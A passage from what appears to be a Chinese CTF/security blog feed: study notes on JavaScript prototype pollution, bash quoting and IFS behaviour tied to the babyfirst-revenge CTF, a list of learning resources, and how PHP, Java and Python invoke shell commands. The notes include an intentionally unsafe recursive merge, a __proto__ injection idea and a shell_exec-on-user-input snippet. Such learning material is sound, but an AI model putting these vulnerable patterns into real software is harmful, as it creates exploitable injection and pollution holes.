属性的变化而变化</li><li>通过同一个构造函数构造的对象的 <code>[[Prototype]]</code> 是同一个对象。所有通过同一个构造函数创建的实例共享同一个原型对象，但是修改(这里的修改不是说添加而是指向另一个对象，<strong>地址不同</strong>)不是“同步”进行的，指向了不同的对象 -&gt; 原来的对象还可以访问，垃圾收集器不会处理</li></ol><h3 id="4-DONE-是否会造成无限循环的问题？"><a href="#4-DONE-是否会造成无限循环的问题？" class="headerlink" title="*4. DONE: 是否会造成无限循环的问题？"></a>*4. DONE: 是否会造成无限循环的问题？</h3><ol><li><p>有一种情况，如下，见注释即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;&#125;</span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">b</span>=&#123;<span class="string">&quot;AAA&quot;</span>: <span class="string">&quot;hello&quot;</span>&#125;</span><br><span class="line"><span class="comment">// Object有b属性，而b的原型是Object吗？在浏览器中看起来像是创建了无数个对象</span></span><br><span class="line"><span class="comment">// 但是实际上并没有</span></span><br><span class="line">   <span class="comment">// 从原型链的角度看一直是b -&gt; Object -&gt; null；a -&gt;&gt; Object -&gt; null</span></span><br><span class="line">   <span class="comment">// 从对象角度来看始终只有三个对象，一个就是b，一个就是a还有Object</span></span><br><span class="line">      <span class="comment">/*      a ——&gt; b &lt;——&gt; Object &lt;——</span></span><br><span class="line"><span class="comment">       *     |                      | </span></span><br><span class="line"><span class="comment">       *     | —— —— —— —— —— —— —— |   </span></span><br><span class="line"><span class="comment">       */</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="Js原型链基础"><a href="#Js原型链基础" class="headerlink" title="Js原型链基础"></a>Js原型链基础</h2><h3 id="什么是原型链"><a href="#什么是原型链" class="headerlink" title="什么是原型链"></a>什么是原型链</h3><ol><li>getter和setter<ol><li>一种语法：通过调用属性的方法来隐式调用一组函数</li><li>详见<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Working_with_objects#%E5%AE%9A%E4%B9%89_getter_%E4%B8%8E_setter">mdn getter和setter</a></li></ol></li><li>js原型链<ol><li>详见<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain#%E5%9F%BA%E4%BA%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%9A%84%E7%BB%A7%E6%89%BF">还是mdn，绝了，web手必备</a></li><li>!!! Notice 流程详见<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain#%E6%A3%80%E6%9F%A5%E5%8E%9F%E5%9E%8B%EF%BC%9A%E6%9B%B4%E6%B7%B1%E5%85%A5%E7%9A%84%E7%A0%94%E7%A9%B6">有创建一个原型的详细流程</a></li><li>核心思想：基于对象的链而非类的链；对象方法基于this；<strong>动态实时改变的</strong></li><li>第一次看的时候被混淆的几个点<ol><li><code>someObject.[[Prototype]]</code> 用于标识 someObject 的原型 -&gt; 可以通过 Object.getPrototypeOf() 和 Object.setPrototypeOf() 函数来访问</li><li><strong>设置<code>[[Prototype]]</code></strong>: <code>&#123; __proto__: ... &#125;</code> 语法与 <code>obj.__proto__</code> 访问器不同：前者是标准且未被弃用，后者则是被许多js引擎实现的原型setter和getter(非标准并逐步弃用)<ol><li><code>&#123; __proto__: ... &#125;</code> 是一种对象字面量语法，允许你在创建对象时指定其原型(这里不是getter和setter)。这是 ES5 引入的一个非标准特性，后来在 ES6 中被标准化为一个正式的语言特性</li></ol></li><li><strong>构造函数的.prototype属性</strong>: 构造函数可以**指定(自定义)**一个有特殊含义的属性prototype -&gt; 当你定义一个构造函数时，JavaScript 会自动为这个构造函数创建一个 prototype 对象。这个原型对象默认有一个 constructor 属性，指向构造函数本身<code>Person.prototype.constructor===Person</code><ol><li>有什么用呢？通过构造函数创建的每一个实例都会自动将构造函数的 prototype 属性作为其 <code>[[Prototype]]</code> -&gt; 是自动通过this实现的，特殊情况：如果构造函数返回非原始值而是一个新对象时，则该值将成为 new 表达式的结果。在这种情况下，<code>[[Prototype]]</code> 可能无法正确绑定——但在实践中应该很少发生</li><li><code>obj.constructor</code>:(会通过原型链寻找)的作用在于追踪到构造函数，一些内置操作也会读取 constructor 属性，如果没有设置，它们可能无法按预期工作</li></ol></li></ol></li></ol></li></ol><h3 id="类是构造函数语法糖"><a href="#类是构造函数语法糖" class="headerlink" title="类是构造函数语法糖"></a>类是构造函数语法糖</h3><ol><li>js中的类<ol><li>简单了解：可以暂时理解为类是构造函数的语法糖，这意味着你仍然可以修改 Box.prototype 来改变所有实例的行为</li></ol></li><li>Dive into<ol><li><code>alert(typeof Classname)</code>显示为function</li><li>函数转换示例<img src="/pic/Js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%80%9F%E9%80%9A/%E5%87%BD%E6%95%B0%E8%BD%AC%E6%8D%A2.png" alt="理解"><ol><li>转换为对于Classname()函数prototype属性的内容，<code>User.prototype.constrcutor===User</code></li></ol></li><li><a href="https://zh.javascript.info/class">see more in 现代js教程</a></li></ol></li></ol><h2 id="Js原型链污染"><a href="#Js原型链污染" class="headerlink" title="Js原型链污染"></a>Js原型链污染</h2><h3 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h3><ol><li>快速上手<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">离别歌yyds</a></li></ol><h3 id="与问题3进行区分与原理解释"><a href="#与问题3进行区分与原理解释" class="headerlink" title="*与问题3进行区分与原理解释"></a>*与问题3进行区分与原理解释</h3><ol><li><p>在js中对象是通过地址进行区分的，里面的修改是指指向另一个新的对象(新的地址)，而原来的地址已经定下来而且没有被垃圾回收</p></li><li><p>原型链污染可以是建立在指向同一个原型的情况下<strong>添加属性&#x2F;函数</strong>进行污染</p></li><li><p>原型链污染示例</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 此例子无法进行原型链污染，只能修改对象的__proto__</span></span><br><span class="line"><span class="keyword">let</span> o1 = &#123;<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">a</span>:<span class="number">1</span>&#125;&#125;</span><br><span class="line">   <span class="comment">// 建立后的__proto__指向是本身的[[Prototype]]，改变了[[Prototype]]的指向</span></span><br><span class="line"><span class="keyword">let</span> o2 = &#123;&#125;</span><br><span class="line">o2.<span class="property">a</span>  <span class="comment">// 显示undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果是在merge中，则可以通过对原有对象添加属性，直接修改所有prototype那个对象而不是替换指向</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// !!!总的来说，就是只能添加内容，不能整体替换指向，再本质就是要进入到对象中修改(merge中就是)</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="1-普通可控输入的原型链污染"><a href="#1-普通可控输入的原型链污染" class="headerlink" title="1. 普通可控输入的原型链污染"></a>1. 普通可控输入的原型链污染</h3><ol><li><p>示例代码</p><ol><li>污染的深度这里会受到限制，所以漏洞可否利用还要看<strong>原型是否一样</strong></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">matrix[client.<span class="property">input1</span>][client.<span class="property">input2</span>]   </span><br><span class="line"><span class="comment">// 可以传入input1=&quot;__proto__&quot;来实现污染</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="2-Merge类型的原型链污染"><a href="#2-Merge类型的原型链污染" class="headerlink" title="2. Merge类型的原型链污染"></a>2. Merge类型的原型链污染</h3><ol><li><p>示例代码与前提</p><ol><li>json.parse()的递归不安全merge</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><em><strong>为什么要json.parse()?</strong></em>: 在JavaScript中，JSON.parse()函数在处理JSON字符串时，会将JSON对象中的任何键视为任意字符串，包括<code>__proto__</code></p><ol><li>这里的<code>__proto__</code>并非是指向原型的属性，而是一个普通的自有属性(字符串)，可以被<code>getOwnProperties(&quot;__proto__&quot;)</code>和<code>hasOwnProperties(&quot;__proto__&quot;)</code>识别</li><li>过程：<code>__proto__</code> 属性仅仅是一个普通的自有属性，对象在查找属性时会在真正的原型上进行查找，但在执行 clone 函数的过程中，由于该属性名字的特殊性，触发了新对象的原型的修改，最终导致了 prototype pollution</li><li>如果是<em><strong>直接<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>的话</strong></em>，__proto__已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是[a, b]，__proto__并不是一个key，自然也不会修改Object的原型</li><li>JSON.parse中的原型链污染<img src="/pic/Js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%80%9F%E9%80%9A/JSONparse%E4%B8%AD%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.png" alt="Json.parse"><ol><li>详见权威报告，离别歌引用文章中有和<a href="https://xz.aliyun.com/t/2802?time__1311=n4+xni0=G=DQtAK0QD/8WpjrYDOboKbDBnhoD">先知社区</a></li></ol></li></ol></li><li><p>预防</p><ol><li>只需要在merge中加上小小的一段检验后跳过即可</li></ol></li></ol><h3 id="实战指南"><a href="#实战指南" class="headerlink" title="*实战指南"></a>*实战指南</h3><ol><li>有很多相关的函数(递归合并的话)，做题时重要的是思路的方向，然后根据具体的方向去查找更加重要，<em><strong>特征</strong></em><ol><li>merge</li><li>类似js这种没有严格访问控制属性的语言</li></ol></li><li>一些可以实战时查阅的资料<ol><li>火狐收藏夹</li><li>这篇不错<a href="https://xz.aliyun.com/t/12053?time__1311=GqGxR70Qi=itKGN4eeqBInO6Kf27EbD#toc-0">关于Prototype Pollution Attack的二三事</a></li><li>有一些cve<a href="https://www.freebuf.com/articles/web/275619.html">JavaScript原型链污染原理及相关CVE漏洞剖析</a></li></ol></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Node安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从babyfirst-revengev2看bash中的字符串</title>
      <link href="/2024/10/27/%E4%BB%8Ebabyfirst-revengev2%E7%9C%8Bbash%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2024/10/27/%E4%BB%8Ebabyfirst-revengev2%E7%9C%8Bbash%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>bash转义与换行问题<ol><li><a href="https://www.bookstack.cn/read/bash-tutorial/docs-quotation.md">阮一峰 挺好的教程</a></li></ol></li><li>其他参考资料见小部分中的如<code>无引用变量的拓展</code></li></ol><h2 id="php如何处理用户输入的字符串"><a href="#php如何处理用户输入的字符串" class="headerlink" title="php如何处理用户输入的字符串"></a>php如何处理用户输入的字符串</h2><ol><li><p>当处理用户输入的字符串(比如<code>$_GET</code>)并将其传递给系统命令时，PHP 本身不会自动为这些字符串添加引号，只是直接进行添加(什么样就放什么进去)，只有字面量才需要进行(单引号和双引号的考虑)</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$input</span>);</span><br><span class="line"><span class="comment">// 输入?cmd=\&#x27;\&quot;&#x27;&quot;都可以正常输出</span></span><br></pre></td></tr></table></figure></li><li><p>对用户输入进行处理</p><ol><li><code>escapeshellarg()</code> 会确保 $user_input 被正确转义并用单引号包裹</li><li>需要转义整个命令字符串而不是单独的参数，可以使用 <code>escapeshellcmd()</code>。这个函数会转义可能被 shell 特别解释的字符，但不会添加引号</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user_input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line"><span class="variable">$safe_command</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$user_input</span>);</span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$safe_command</span>);</span><br></pre></td></tr></table></figure></li></ol><h2 id="bash中字符串的转义-无引号和单引号与双引号"><a href="#bash中字符串的转义-无引号和单引号与双引号" class="headerlink" title="bash中字符串的转义(无引号和单引号与双引号)"></a>bash中字符串的转义(无引号和单引号与双引号)</h2><ol><li><img src="/pic/%E4%BB%8Ebabyfirst-revengev2%E7%9C%8Bbash%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/bash%E4%B8%AD%E5%8D%95%E5%BC%95%E5%8F%B7%E4%B8%8E%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%9A%84%E8%BD%AC%E4%B9%89%E5%8C%BA%E5%88%AB.png" alt="先上图"><ol><li>Bash 只有一种数据类型，就是字符串。不管用户输入什么数据，Bash 都视为字符串</li><li><em><strong>单引号只有一个意外，那就是&#39;</strong></em>: 单引号用于保留字符的字面含义，各种特殊字符在单引号里面，都会变为普通字符，比如星号（*）、美元符号（$）、反斜杠（\）等</li><li><em><strong>双引号</strong></em>: 双引号比单引号宽松，可以保留大部分特殊字符的本来含义，但是三个字符除外：美元符号（$）、反引号（&#96; ）和反斜杠（\）。也就是说，这三个字符在双引号之中，会被 Bash 自动扩展<ol><li>*号等通配符会原样进行输出</li><li>灵活性主要用于变量替换</li><li><strong>可以保持原有格式输出 -&gt; 不加双引号再echo中会丢失，在echo配合重定向中会出事(</strong><img src="/pic/%E4%BB%8Ebabyfirst-revengev2%E7%9C%8Bbash%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/bash%E4%B8%AD%E5%8F%8C%E5%BC%95%E5%8F%B7%E4%BF%9D%E6%8C%81%E6%A0%BC%E5%BC%8F.png" alt="bash中双引号保持格式"></li></ol></li></ol></li><li><em><strong>不使用引号的字符串</strong></em> –&gt; 更加详细要去到<strong>无引用变量的拓展</strong>这个标题处<ol><li>以<code>echo hello world</code>为例<ol><li>先上图<img src="/pic/%E4%BB%8Ebabyfirst-revengev2%E7%9C%8Bbash%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/bash%E4%B8%AD%E6%B2%A1%E6%9C%89%E5%BC%95%E5%8F%B7%E7%9A%84echo.png" alt="echo字符串图"></li><li>无引号：当你不使用引号时，echo 命令会将每个单词视为一个单独的参数</li><li>双引号：当你使用双引号时，整个字符串被当作一个单一的参数传递给 echo</li></ol></li><li><strong>总结</strong>: 无引号字符串：Bash 会将字符串中的空格作为分隔符，并且会解释特殊字符和通配符 –&gt; 与双引号不同的是<code>cat *.txt</code>会进行通配符匹配，即会解析*</li><li>示例解读</li></ol></li></ol><h2 id="bash中的多行命令-部分"><a href="#bash中的多行命令-部分" class="headerlink" title="bash中的多行命令(部分)"></a>bash中的多行命令(部分)</h2><ol><li><em><strong>引号</strong></em>: 单双引号中的字符串字面量本身就可以多行输入和显示 -&gt; 不需要使用\来进行换行了<ol><li>本质: 换行符变成了普通字符而不能发挥作用</li></ol></li><li><em><strong>反斜杠\</strong></em>: 规则如下<ol><li><p>反斜杠 \ 放在一行的末尾，表示该行的结束不是命令的结束，而是继续到下一行</p><ol><li><strong>要搭配换行符使用才行</strong>: 最后一个反斜杠：如果一行以反斜杠 \ 结束，并且后面没有任何字符（包括空格），那么这个反斜杠会被视为普通字符，而不是续行符；后续有字符但是不是换行符也不会有换行作用</li></ol><blockquote><p>接下来这两个不太确定，ai说的但是实践出来不是<br>反斜杠 \ <strong>后面的所有空格都会被忽略</strong>。这意味着你可以使用多个空格或制表符来格式化代码，而不会影响命令的实际内容<br>如果反斜杠 \ 后面跟着的是注释符号 #，那么<strong>注释部分会被忽略</strong>，但反斜杠仍然会作为续行符</p></blockquote></li><li><p>当使用<code>bash -c</code>执行命令时，反斜杠 \ 也可以作为续行符在脚本文件中，反斜杠 \ 也可以用来将长命令拆分成多行</p></li><li><p>在脚本文件中，反斜杠 \ 也可以用来将长命令拆分多行</p></li></ol></li><li>还有here string和here doc的等其他篇吧，不要跑题太多了</li></ol><h2 id="Back-to-babyfirst-revengev2"><a href="#Back-to-babyfirst-revengev2" class="headerlink" title="Back to babyfirst-revengev2"></a>Back to babyfirst-revengev2</h2><h3 id="我的困惑"><a href="#我的困惑" class="headerlink" title="我的困惑"></a>我的困惑</h3><ol><li>Q: php命令执行会按照传入的command的引号吗，还是在bash层面进行处理</li><li>A: 已知php中底层的执行函数为<code>/bin/sh -c $command</code>(详见<code>phpm命令执行底层原理小记</code>)，<strong>调用链从近到远进行入手</strong><ol><li>Q: 此时与传入的<code>$command</code>有很大的关系，&#x2F;bin&#x2F;sh如何解释无引号字符?</li><li>A: slpit+glob，传入的命令中没有空格<code>$IFS</code>的话就是正常的<ol><li>Q: 那在<code>. _</code>调用脚本如何解释呢</li><li>A: php中直接作为输入导致，<strong>字符已经确定为一个整体</strong>，单引号和双引号只是解析的方式</li></ol></li><li><code>$command</code>是php传入的，php从用户的输入<code>$_GET[&#39;cmd&#39;]</code>处获取信息<ol><li>Q: php中判断是单引号还是双引号字符串<ol><li>从$_GET[]</li><li>用户输入获取的呢</li></ol></li><li>A: 直接作为输入，不管单双引号</li></ol></li></ol></li><li>理解<ol><li>!!! Notice 其实双引号和单引号是<strong>解析字符串的方式</strong>，存储在内部是不管引号的，去想象实际的字符</li><li>包括glob拓展后的列表</li></ol></li></ol><h3 id="无引用变量的拓展"><a href="#无引用变量的拓展" class="headerlink" title="*无引用变量的拓展"></a>*无引用变量的拓展</h3><ol><li>split and glob的概念<ol><li>ref<ol><li><a href="https://unix.stackexchange.com/questions/108963/expansion-of-a-shell-variable-and-effect-of-glob-and-split-on-it">stack exchange ref</a> –&gt; 有例子有概念，很不错</li><li><a href="https://www.gnu.org/software/bash/manual/bash.html#Shell-Parameter-Expansion">gnu 官方文档</a><ol><li><a href="http://www.gnu.org/software/bash/manual/bash.html#Filename-Expansion">拓展</a></li><li><a href="http://www.gnu.org/software/bash/manual/bash.html#Word-Splitting">split</a></li></ol></li><li><em><strong>利用此特性的漏洞利用</strong></em><a href="https://medium.com/@bouss3id.abdelkader/unquoted-bash-variable-security-implications-bypassing-if-condition-in-bash-ctf-write-up-79648dc4e910">利用此特性的漏洞利用</a></li></ol></li><li>split: 在每个空格序列处将值拆分为单独的单词。(根据$IFS，可以更改为在非空格的字符处拆分。)因此，结果不再是一个字符串，而是一个<strong>字符串列表</strong>。如果值只包含空格，则此列表可以为空</li><li>glob: 将列表中的每个元素视为一个文件名模式，即一个glob。如果模式与某些文件匹配，则将其替换为匹配文件名的列表，否则将其保留 –&gt; 会进行glob匹配</li></ol></li><li>无引用变量<ol><li><p><code>cmd $var</code> -&gt; <code>cmd(glob(split($var)))</code>后面是一个列表</p></li><li><p><code>/bin/sh -c $cmd</code>也是按照上述的方式，<code>$IFS</code>中的值很重要</p><ol><li><strong>output $IFS in readable way</strong>: IFS的默认值是由空格、制表符和换行符组成的三个字符串<ol><li><code>echo &quot;$IFS&quot; | cat -et</code>(这里需要加上双引号)才会正常，直接$IFS不太行</li><li><code>echo &quot;$IFS&quot; | xxd</code>可以查看16进制</li></ol></li></ol>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$test</span>=<span class="built_in">echo</span>\ <span class="built_in">test</span></span><br><span class="line">/bin/sh -c <span class="variable">$test</span>    <span class="comment"># 无法正常运行</span></span><br><span class="line"><span class="variable">$IFS</span>= <span class="comment"># 这里是空格</span></span><br><span class="line">/bin/sh -c <span class="variable">$test</span>    <span class="comment"># 可以正常运行，输出test</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="在bash-POSIX-shell中忘记引用变量的安全性影响"><a href="#在bash-POSIX-shell中忘记引用变量的安全性影响" class="headerlink" title="***在bash&#x2F;POSIX shell中忘记引用变量的安全性影响"></a>***在bash&#x2F;POSIX shell中忘记引用变量的安全性影响</h3><ol><li>Stack Exchange高关注议题<a href="https://unix.stackexchange.com/questions/171346/security-implications-of-forgetting-to-quote-a-variable-in-bash-posix-shells">Security implications of forgetting to quote a variable in bash&#x2F;POSIX shells</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>语言自学指南</title>
      <link href="/2024/10/26/%E8%AF%AD%E8%A8%80%E8%87%AA%E5%AD%A6%E6%8C%87%E5%8D%97/"/>
      <url>/2024/10/26/%E8%AF%AD%E8%A8%80%E8%87%AA%E5%AD%A6%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<blockquote><p>中国油锯古瓦，自学才是效率最高的学习  </p><hr><ol><li>这里总结一下我搜集的各种资源(无视频)，其中有些也没看完&#x2F;只是浅浅过一遍  </li><li>同时，语言是不断发展的，这是2024年搜集到的(并不是2024年的)<br>总而言之：翻到这篇资源的伙伴请睁大你的眼睛</li></ol></blockquote><h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><ol><li><a href="https://www.gnu.org/software/bash/manual/bash.html">gnu bash 2022官方文档</a></li><li><a href="https://www.ruanyifeng.com/blog/2020/04/bash-tutorial.html">阮一峰</a></li><li><a href="https://tldp.org/LDP/abs/html/">Advanced Bash-Scripting Guide en</a></li><li><a href="https://www.shellscript.sh/">shell script</a></li><li><a href="https://www.shellscript.sh/">命令行的艺术</a></li></ol><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><ol><li><a href="https://zh.javascript.info/">js现代教程 真神</a></li><li><a href="https://nodejs.org/en/learn/getting-started/introduction-to-nodejs">node.js</a></li><li><a href="https://expressjs.com/">express.js</a></li><li><a href="https://vuejs.org/guide/introduction.html">vue3 有中文版</a></li></ol><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><ol><li><a href="https://liaoxuefeng.com/books/java/">廖雪峰</a></li><li><a href="https://pdai.tech/md/java/">java全栈指南</a></li><li><a href="https://javaguide.cn/java/">java guide</a></li></ol><h2 id="Go"><a href="#Go" class="headerlink" title="Go"></a>Go</h2><h2 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h2><blockquote><p>用好vim这个工具可以大大提高效率，Vscode+Vim+Win是可以配置出一套极少需要鼠标的工作流操作的</p></blockquote><ol><li><a href="https://docs.kilvn.com/vim_zh_cn/">learn vim中文版</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php命令执行底层原理的小记</title>
      <link href="/2024/10/26/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E7%9A%84%E5%B0%8F%E8%AE%B0/"/>
      <url>/2024/10/26/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E7%9A%84%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>起源来自hitcon 2017 babyfirst-revenge和babyfirst-revengev2中关于转义\处理的问题，折腾我一个晚上(生气) -&gt; 最后感谢v1nd大哥</p></blockquote><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>php命令执行底层原理<ol><li><a href="https://qftm.github.io/2020/12/01/command-execution-research-php/">其实看这篇就好了，只是自己总结一下，没有太考虑阅读感受(比较精简)</a></li><li><a href="https://xz.aliyun.com/t/6542?time__1311=n4+xnD0Dg7G=74xBkbDyDmrEDuGDBlOcGOYrYD">命令执行成因小注</a></li><li><a href="https://zhuanlan.zhihu.com/p/339071601">知乎安全客，像是第一篇的转载</a></li></ol></li></ol><h2 id="Linux下的命令执行"><a href="#Linux下的命令执行" class="headerlink" title="Linux下的命令执行"></a>Linux下的命令执行</h2><ol><li>分为自身终端封装的指令(内置)和终端下调用其它目录下的可执行程序(外部)共两种<ol><li>通过<code>type echo</code>和<code>which whoami</code>可以知道，可以通过<code>enable</code>和<code>help</code>来查看内建指令<ol><li>其中<code>/bin</code>是一个指向<code>/usr/bin</code>的链接文件噢</li></ol></li><li><em><strong>Difference</strong></em><ol><li>shell会查找command是否为built-in command类型，对于built-in command指令类型，shell会自己解释执行，而无需fork一个child process子进程来执行该command指令；</li><li>对于，不是built-in command指令类型，shell会从环境变量中按顺序搜索该command指令，如果能查到则会fork一个child process子进程来执行该command指令；然而，对于找不到的command指令，一般为：执行的指令不存在、指令未加入到环境变量中</li></ol></li></ol></li></ol><h2 id="Windows下的命令执行"><a href="#Windows下的命令执行" class="headerlink" title="Windows下的命令执行"></a>Windows下的命令执行</h2><ol><li>同linux一样，分为自身终端封装的指令(内置)和终端下调用其它目录下的可执行程序(外部)共两种<ol><li>使用<code>where cd</code>或者<code>set path=</code>后使得path&#x3D;(null)来调用命令共两种方法可以进行区分<ol><li>where中显示找不到但是可以执行的命令为内建命令，找得到的都是非内建的</li><li><code>set path=</code>后可以执行的为内建命令，不可以执行的是外部命令</li><li>无法使用<code>help</code>命令(本生是外键)，会把所有内+外都列出来</li></ol></li></ol></li><li>差异也是会不会开子进程的情况</li></ol><h2 id="Sytem-Execution-Func-in-different-lang"><a href="#Sytem-Execution-Func-in-different-lang" class="headerlink" title="Sytem Execution Func in different lang"></a>Sytem Execution Func in different lang</h2><blockquote><p>命令执行函数执行分为两类，一类：传入的命令仅仅作为可执行终端中的命令执行；另一类：传入的命令仅仅是运行传入的命令中的可执行程序。对象不同，一类：是底层语言系统终端帮我们执行传入的命令；另一类：是自己启动传入的可执行程序。</p></blockquote><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP - 底层调用系统终端，执行命令     Mode =&gt; Window：cmd.exe /c Command || Linux：sh -c Command</span><br></pre></td></tr></table></figure><ol><li>linux和windows都有追踪<em><strong>程序流的工具</strong></em><ol><li>linux: strace</li><li>windows: OD动态调试，微软官方提供的Process Explorer工具进行跟踪分析</li></ol></li><li>命令执行函数在bash中调用的命令是<code>/bin/sh -c &quot;...&quot;</code><ol><li>这里单引号和双引号一样，都可以变量替换 -&gt; <code>/bin/sh -c &#39;echo $SHELL&#39;</code>也可以正确输出</li></ol></li><li>在<code>system</code>的实验下都只是调用了一个子进程<code>/bin/sh</code></li><li>Shell 执行：PHP 中的shell_exec 、 exec和system等函数调用系统的 shell（通常为&#x2F;bin&#x2F;sh或&#x2F;bin&#x2F;bash ）来执行命令。这意味着他们启动一个新的 shell 进程来解释您提供的命令字符串</li></ol><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 与php不同的模型</span></span><br><span class="line">Java - 底层不调用系统终端，自己启动传入的可执行程序    Mode =&gt; Window：Command || Linux：Command</span><br></pre></td></tr></table></figure><ol><li>在Java语言里面，针对Linux平台，系统命令<code>echo 111 &gt; shell.txt</code>传入CommandExecFunc函数，最终在底层相当于执行<code>/bin/echo 111 &gt; shell.txt</code><ol><li>这里的echo作为可执行程序出现，而不是终端中的命令，没有整体再次进行解释</li></ol></li><li>window中也一样</li><li>无 Shell 开销：由于 Java 默认情况下不通过 shell，因此您可以更直接地控制命令的执行，但这也意味着您可能需要自己处理环境变量、命令行解析和输出重定向（如果需要）</li></ol><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 和php一样</span></span><br><span class="line">Python - 底层调用系统终端，执行命令     Mode =&gt; Window：cmd.exe /c Command || Linux：sh -c 